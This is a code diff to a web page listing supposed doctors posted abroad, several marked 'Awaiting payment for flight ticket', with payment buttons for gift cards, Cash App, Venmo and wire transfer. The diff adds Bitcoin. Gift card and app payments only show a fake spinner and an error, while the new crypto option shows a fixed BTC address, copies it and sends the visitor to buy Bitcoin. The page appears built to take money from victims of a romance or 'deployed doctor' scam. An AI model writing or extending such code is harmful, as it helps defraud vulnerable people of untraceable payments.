@@ -266,7 +266,7 @@
             display: block;
         }
 
-        /* ---------- MODAL (Loading + Red Error) ---------- */
+        /* ---------- MODAL (Loading + Red Error + Crypto) ---------- */
         .modal-overlay {
             position: fixed;
             top: 0;
@@ -335,6 +335,10 @@
             color: #dc2626;
         }
 
+        .modal-box .btc-icon {
+            color: #f7931a;
+        }
+
         .modal-box h2 {
             font-size: 1.6rem;
             color: #0a2f44;
@@ -349,6 +353,20 @@
         }
 
         .modal-box .sub-text strong {
+            color: #0a2f44;
+        }
+
+        .modal-box .crypto-address {
+            background: #f1f5f9;
+            padding: 12px 16px;
+            border-radius: 12px;
+            word-break: break-all;
+            font-family: 'Courier New', monospace;
+            font-weight: 700;
+            font-size: 0.95rem;
+            border: 1px solid #e2e8f0;
+            width: 100%;
+            margin-bottom: 15px;
             color: #0a2f44;
         }
 
@@ -383,6 +401,20 @@
             background: #7f1d1d;
         }
 
+        .modal-box .btn-close.btc-btn {
+            background: #f7931a;
+        }
+
+        .modal-box .btn-close.btc-btn:hover {
+            background: #d67a0f;
+        }
+
+        .modal-box .hint-text {
+            margin-top: 10px;
+            font-size: 0.8rem;
+            color: #64748b;
+        }
+
         @media (max-width: 640px) {
             .header h1 {
                 font-size: 2.2rem;
@@ -413,7 +445,7 @@
             <i class="fas fa-search"></i>
             <input type="text" id="searchInput" placeholder="Search for a doctor's name..." />
         </div>
-        <div class="counter" id="resultCounter">Showing 0 of 40 doctors</div>
+        <div class="counter" id="resultCounter">Showing 0 of 43 doctors</div>
     </div>
 
     <!-- CARDS -->
@@ -432,9 +464,10 @@
 
     <script>
         // ============================================================
-        // 1. DOCTOR DATA (40+ names – add more here!)
+        // 1. DOCTOR DATA (43 names)
         // ============================================================
         var doctors = [
+            // --- ORIGINAL 5 ---
             { name: "Steve Miller", from: "Pennsylvania", currentlyIn: "Somalia", job: "Medical Doctor",
             status: null },
             { name: "Anthony Mike", from: "Honolulu, Hawaii", currentlyIn: "Iraq", job: "Surgeon and Orthopedic",
@@ -444,6 +477,8 @@
                 status: null },
             { name: "Samson Donald", from: "Sacramento, California", currentlyIn: "Iceland", job: "Rig Engineer",
                 status: "Awaiting payment for flight ticket" },
+
+            // --- PREVIOUS 35 ---
             { name: "Sarah Chen", from: "San Francisco, CA", currentlyIn: "Kenya", job: "Pediatrician", status: null },
             { name: "Michael Okafor", from: "Lagos, Nigeria", currentlyIn: "United Kingdom", job: "Cardiologist",
                 status: null },
@@ -497,14 +532,24 @@
             { name: "Felipe Ortega", from: "Buenos Aires, ARG", currentlyIn: "Paraguay", job: "Cardiologist",
                 status: null },
             { name: "Ananya Chatterjee", from: "Kolkata, India", currentlyIn: "Sri Lanka", job: "Anesthesiologist",
-                status: null }
+                status: null },
+
+            // --- 3 NEW DOCTORS ---
+            { name: "David Bryan", from: "Los Angeles, California", currentlyIn: "Iraq", job: "Doctor",
+                status: "Awaiting payment for flight ticket" },
+            { name: "David McKinney", from: "Los Angeles, California", currentlyIn: "Iraq", job: "Doctor",
+                status: "Awaiting payment for flight ticket" },
+            { name: "Christopher Adams", from: "Los Angeles, California USA", currentlyIn: "Yemen", job: "Surgeon Doctor",
+                status: "Vacation Approval" }
         ];
 
+        // Payment methods definition
         var paymentMethods = [
             { icon: "fa-gift", label: "Pay with Gift Card" },
             { icon: "fa-university", label: "Money Transfer" },
             { icon: "fa-mobile-alt", label: "Cash App" },
-            { icon: "fa-venmo", label: "Venmo" }
+            { icon: "fa-venmo", label: "Venmo" },
+            { icon: "fa-bitcoin", label: "Pay with Crypto" }
         ];
 
         // DOM refs
@@ -518,15 +563,34 @@
         var modalTimeout = null;
 
         // ============================================================
-        // 2. OPEN MODAL : Loading -> Red Error
+        // 2. PAYMENT HANDLER
         // ============================================================
-        function openModal(methodName, doctorName) {
+        function handlePayment(methodName, doctorName) {
+            // --- CRYPTO: Show address + copy + redirect ---
+            if (methodName === "Pay with Crypto") {
+                if (modalTimeout) {
+                    clearTimeout(modalTimeout);
+                    modalTimeout = null;
+                }
+                modalOverlay.classList.add('show');
+                modalContent.innerHTML =
+                    '<div class="icon-large btc-icon"><i class="fab fa-bitcoin"></i></div>' +
+                    '<h2>Crypto Payment</h2>' +
+                    '<p class="sub-text">Send BTC to the address below for <br><strong>' + doctorName +
+                    '</strong></p>' +
+                    '<div class="crypto-address">183krY9Et82mi8U273Q8gsK5ZYPnUJHniY</div>' +
+                    '<button class="btn-close btc-btn" onclick="copyCryptoAddress()"><i class="fas fa-copy"></i> Copy Address</button>' +
+                    '<p class="hint-text">You will be redirected to Changelly after copying.</p>';
+                return;
+            }
+
+            // --- ALL OTHER PAYMENTS (Gift Card, Money Transfer, Cash App, Venmo):
+            //     Loading spinner -> Red error message
             if (modalTimeout) {
                 clearTimeout(modalTimeout);
                 modalTimeout = null;
             }
 
-            // Show modal with LOADING state
             modalOverlay.classList.add('show');
             modalContent.innerHTML =
                 '<div class="icon-large spinner"><i class="fas fa-spinner fa-spin"></i></div>' +
@@ -535,7 +599,6 @@
                 '</strong> via ' + methodName + '...</p>' +
                 '<button class="btn-close" disabled>Processing...</button>';
 
-            // After 2 seconds, switch to RED ERROR message
             modalTimeout = setTimeout(function() {
                 modalContent.innerHTML =
                     '<div class="icon-large error-icon"><i class="fas fa-times-circle"></i></div>' +
@@ -550,7 +613,26 @@
         }
 
         // ============================================================
-        // 3. CLOSE MODAL
+        // 3. CRYPTO COPY FUNCTION
+        // ============================================================
+        function copyCryptoAddress() {
+            var address = "183krY9Et82mi8U273Q8gsK5ZYPnUJHniY";
+            if (navigator.clipboard && navigator.clipboard.writeText) {
+                navigator.clipboard.writeText(address).then(function() {
+                    window.open("https://Changelly.com/buy/btc", "_blank");
+                    closeModal();
+                }).catch(function() {
+                    window.open("https://Changelly.com/buy/btc", "_blank");
+                    closeModal();
+                });
+            } else {
+                window.open("https://Changelly.com/buy/btc", "_blank");
+                closeModal();
+            }
+        }
+
+        // ============================================================
+        // 4. CLOSE MODAL
         // ============================================================
         function closeModal() {
             if (modalTimeout) {
@@ -567,7 +649,7 @@
         });
 
         // ============================================================
-        // 4. RENDER CARDS
+        // 5. RENDER CARDS
         // ============================================================
         function renderCards(query) {
             var cards = container.querySelectorAll('.card');
@@ -602,7 +684,7 @@
                     var safeName = doc.name.replace(/'/g, "\\'");
                     var safeMethod = pm.label.replace(/'/g, "\\'");
                     methodsHTML +=
-                        '<span class="pay-method" onclick="openModal(\'' + safeMethod + '\', \'' + safeName +
+                        '<span class="pay-method" onclick="handlePayment(\'' + safeMethod + '\', \'' + safeName +
                         '\')"><i class="fas ' + pm.icon + '"></i> ' + pm.label + '</span>';
                 }
 
